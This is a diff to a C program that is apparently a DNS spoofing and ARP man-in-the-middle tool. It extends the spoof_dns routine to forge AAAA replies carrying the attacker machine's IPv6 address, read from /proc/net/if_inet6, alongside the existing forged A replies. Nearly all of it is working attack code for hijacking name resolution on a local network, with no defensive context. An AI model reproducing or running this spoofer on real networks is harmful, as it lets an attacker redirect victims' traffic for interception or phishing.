@@ -97,6 +97,7 @@ unsigned char gateway_mac[6];
 unsigned char target_mac[6];
 
 uint32_t local_ip;
+unsigned char local_ip_6[16];
 
 uint32_t gateway_ip;
 uint32_t target_ip;
@@ -132,6 +133,37 @@ void get_local_mac(int sock) {
 
     local_interface_index = s.ifr_ifindex;
     printf("Local interface index is: %08x\n", local_interface_index);
+
+    FILE* f = fopen("/proc/net/if_inet6", "r");
+    if (!f) {
+        perror("/proc/net/if_inet6 open");
+        exit(EXIT_FAILURE);
+    }
+
+    unsigned int tmp1, tmp2;
+    char dname[256];
+    while (fscanf(f,
+                   " %2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%"
+                   "2hhx%2hhx %*x %x %x %*x %s",
+                   &local_ip_6[0], &local_ip_6[1], &local_ip_6[2], &local_ip_6[3], &local_ip_6[4],
+                   &local_ip_6[5], &local_ip_6[6], &local_ip_6[7], &local_ip_6[8], &local_ip_6[9],
+                   &local_ip_6[10], &local_ip_6[11], &local_ip_6[12], &local_ip_6[13],
+                   &local_ip_6[14], &local_ip_6[15], &tmp1, &tmp2, dname)
+            == 19) {
+        if (strcmp(INTERFACE_NAME, dname) != 0) {
+            continue;
+        } else {
+            break;
+        }
+    }
+
+    fclose(f);
+
+    printf("Local IPv6 address: ");
+    for (int i = 0; i < 16; ++i) {
+        printf("%02x", local_ip_6[i]);
+    }
+    printf("\n");
 }
 
 void ping_ip(const char* ip) {
@@ -373,7 +405,7 @@ void spoof_dns(int sock) {
         ih->id = htons(ntohs(recv_ih->id) + 1);
         ih->ttl = recv_ih->ttl;
         ih->tos = 0;
-        ih->frag_off = 0;
+        ih->frag_off = htons(0x4000);
 
         //UDP stuffs
         uh->source = recv_uh->dest;
@@ -383,7 +415,8 @@ void spoof_dns(int sock) {
         //Transaction ID
         memcpy(data, recv_data, 2);
         //Set response flags to 0x8580
-        data[2] = 0x85;
+        //data[2] = 0x85;
+        data[2] = 0x81;
         data[3] = 0x80;
 
         //Copy number of questions
@@ -411,38 +444,75 @@ void spoof_dns(int sock) {
         //NULL terminate name
         data[12 + name_len + 0] = 0x00;
 
-        //A record, IN address
-        data[12 + name_len + 1] = 0x00;
-        data[12 + name_len + 2] = 0x01;
-        data[12 + name_len + 3] = 0x00;
-        data[12 + name_len + 4] = 0x01;
+        if (recv_data[12 + name_len + 2] == 0x1c) {
+            printf("AAAA record\n");
+            //AAAA request
+            //AAAA record, IN address
+            data[12 + name_len + 1] = 0x00;
+            data[12 + name_len + 2] = 0x1c;
+            data[12 + name_len + 3] = 0x00;
+            data[12 + name_len + 4] = 0x01;
 
-        //Compress name via pointer to question name string
-        data[12 + name_len + 5] = 0xc0;
-        //12 bytes offset
-        data[12 + name_len + 6] = 0x0c;
+            //Compress name via pointer to question name string
+            data[12 + name_len + 5] = 0xc0;
+            //12 bytes offset
+            data[12 + name_len + 6] = 0x0c;
 
-        //Type A, IN address
-        data[12 + name_len + 7] = 0x00;
-        data[12 + name_len + 8] = 0x01;
-        data[12 + name_len + 9] = 0x00;
-        data[12 + name_len + 10] = 0x01;
+            //Type A, IN address
+            data[12 + name_len + 7] = 0x00;
+            data[12 + name_len + 8] = 0x1c;
+            data[12 + name_len + 9] = 0x00;
+            data[12 + name_len + 10] = 0x01;
 
-        //TTL = 7200
-        data[12 + name_len + 11] = 0x00;
-        data[12 + name_len + 12] = 0x00;
-        data[12 + name_len + 13] = 0x1c;
-        data[12 + name_len + 14] = 0x20;
+            //TTL = 7200
+            data[12 + name_len + 11] = 0x00;
+            data[12 + name_len + 12] = 0x00;
+            data[12 + name_len + 13] = 0x1c;
+            data[12 + name_len + 14] = 0x20;
 
-        //Data length = 4
-        data[12 + name_len + 15] = 0x00;
-        data[12 + name_len + 16] = 0x04;
+            //Data length = 16
+            data[12 + name_len + 15] = 0x00;
+            data[12 + name_len + 16] = 0x10;
 
-        memcpy(data + 12 + name_len + 17, &local_ip, 4);
+            //Set ipv6 address
+            memcpy(data + 12 + name_len + 17, &local_ip_6, 16);
 
-        //Set DNS packet length
-        data_len = 33 + name_len;
+            //Set DNS packet length
+            data_len = 45 + name_len;
+        } else {
+            //A request
+            //A record, IN address
+            data[12 + name_len + 1] = 0x00;
+            data[12 + name_len + 2] = 0x01;
+            data[12 + name_len + 3] = 0x00;
+            data[12 + name_len + 4] = 0x01;
 
+            //Compress name via pointer to question name string
+            data[12 + name_len + 5] = 0xc0;
+            //12 bytes offset
+            data[12 + name_len + 6] = 0x0c;
+
+            //Type A, IN address
+            data[12 + name_len + 7] = 0x00;
+            data[12 + name_len + 8] = 0x01;
+            data[12 + name_len + 9] = 0x00;
+            data[12 + name_len + 10] = 0x01;
+
+            //TTL = 7200
+            data[12 + name_len + 11] = 0x00;
+            data[12 + name_len + 12] = 0x00;
+            data[12 + name_len + 13] = 0x1c;
+            data[12 + name_len + 14] = 0x20;
+
+            //Data length = 4
+            data[12 + name_len + 15] = 0x00;
+            data[12 + name_len + 16] = 0x04;
+
+            memcpy(data + 12 + name_len + 17, &local_ip, 4);
+
+            //Set DNS packet length
+            data_len = 33 + name_len;
+        }
         //Set IP len
         ih->tot_len = htons(20 + sizeof(struct udphdr) + data_len);
         //Calculate IP checksum
